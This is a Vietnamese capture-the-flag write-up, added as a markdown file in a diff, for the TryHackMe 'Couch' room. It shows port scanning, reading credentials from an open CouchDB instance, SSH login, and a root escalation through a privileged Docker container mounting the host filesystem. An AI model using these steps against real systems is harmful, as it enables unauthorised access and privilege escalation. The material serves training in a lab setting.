@@ -1,0 +1,109 @@
+---
+title: "Tryhackme - Couch"
+date: "2022-03-28"
+tags: [
+    "web",
+    "linux",
+	"couchdb",
+	"docker",
+    "ssh",
+]
+---
+
+
+Xin chào, lại là tôi đây. Hôm nay tôi sẽ giải CTF [TryHackMe | Couch](https://tryhackme.com/room/couch)
+## Reconnaissance
+
+Việc đầu tiên cần làm là quét các cổng đang mở trên máy chủ mục tiêu
+
+```python
+PORT     STATE SERVICE REASON  VERSION
+22/tcp   open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 349d390934304b3da71edfeba3b0e5aa (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDMXnGZUnLWqLZb8VQiVH0z85lV+G4KY5l5kKf1fS7YgSnfZ+k3CRjAZPuGceg5RQEUbOMCm+0u4SDyIEbwwAXGv0ORK4/VEIyJlZmtlqeyASwR8ML4yjdGqinqOUZ3jN/ZIg4veJ02nr86GZP+Nto0TZt7beaIxykMEZHTdo0CctdKLIet7PpvwG4F5Tn9MBoys9pUjfpcnwbf91Tv6i56Gipo07jKgb5vP8Nl1TXPjWB93WNW2vWEQ1J4tiyZlBeLOaNaEbxvNQFnKxjVYiiLCbcofwSdrwZ7/+sIy5BdiNW+k81rBN3OqaQNZ8urFaiXXf/ukRr/hhjY5a6m0MHn
+|   256 a42eef3a845d211bb9d42613a52ddf19 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNTR07g3p8MfnQVnv8uqj8GGDH6VoSRzwRFflMbEf3WspsYyVipg6vtNQMaq5uNGUXF8ubpsnHeJA+T3RilTLXc=
+|   256 e16d4dfdc8008e86c2132dc7ad85139c (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKLUyz2Tpwc5qPuFxV+HnGBeqLC6NWrmpmGmE0hk7Hlj
+5984/tcp open  http    syn-ack CouchDB httpd 1.6.1 (Erlang OTP/18)
+|_http-server-header: CouchDB/1.6.1 (Erlang OTP/18)
+|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
+| http-methods: 
+|_  Supported Methods: GET HEAD
+|_http-favicon: Unknown favicon MD5: 2AB2AAE806E8393B70970B2EAACE82E0
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+Với port 5984 tôi có web console của CouchDB. Đọc qua document của db này thì tôi tìm được path của web admin là */_utils* 
+
+Để list ra toàn bộ db trên web browser tôi dùng path */_all_dbs*
+
+Dạo qua các db này thì tôi tìm thấy creds bên trong db *secret*
+
+Thử login ssh 
+
+```python
+┌──(neo㉿kali)-[~]
+└─$ ssh atena@10.10.60.64    
+The authenticity of host '10.10.60.64 (10.10.60.64)' can't be established.
+ED25519 key fingerprint is SHA256:QXIT4W/vOthS71YtOAr7s67oloxpMmr0GLRVL9iVFJM.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.60.64' (ED25519) to the list of known hosts.
+atena@10.10.60.64's password: 
+Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-193-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+Last login: Fri Dec 18 15:25:27 2020 from 192.168.85.1
+atena@ubuntu:~$ id
+uid=1000(atena) gid=1000(atena) groups=1000(atena),4(adm),24(cdrom),30(dip),46(plugdev),114(lpadmin),115(sambashare)
+atena@ubuntu:~$ ls
+user.txt
+atena@ubuntu:~$ 
+```
+
+## Privilege escalation
+
+Thử `sudo -l` hay `find` đều không có kết quả. Nhưng khi `ls -la` để xem những file ẩn ở thư mục user *atena*, tôi nhận ra file *.bash_history* có size khá lớn. 
+
+```python
+atena@ubuntu:~$ cat .bash_history 
+sudo -s
+cd /etc/apt/
+rm sources.
+rm sources.list
+wget https://gist.githubusercontent.com/rohitrawat/60a04e6ebe4a9ec1203eac3a11d4afc1/raw/fcdfde2ab57e455ba9b37077abf85a81c504a4a9/sources.list
+apt-get update
+apt-get dist-upgrade 
+sudo apt-get install software-properties-common
+sudo add-apt-repository ppa:couchdb/stable
+sudo apt-get update
+sudo apt-get install couchdb
+sudo chown -R couchdb:couchdb /usr/bin/couchdb /etc/couchdb /usr/share/couchdb
+...
+...
+sudo deluser USERNAME sudo
+sudo deluser atena sudo
+exit
+sudo -s
+docker -H 127.0.0.1:2375 run --rm -it --privileged --net=host -v /:/mnt alpine
+uname -a
+exit
+```
+
+Ở đoạn cuối này, tôi để ý thấy *root* sử dụng -s để lấy shell và thực thi docker. Tôi sẽ dùng lại câu lệnh này
+
+```python
+atena@ubuntu:~$ docker -H 127.0.0.1:2375 run --rm -it --privileged --net=host -v /:/mnt alpin
+/ # id
+uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(fl
+/ # cat /root/root.txt
+cat: can't open '/root/root.txt': No such file or directory
+/ # ls /root
+/ # find / -type f -name root.txt 2>/dev/null
+/mnt/root/root.txt
+/ # 	   
+```
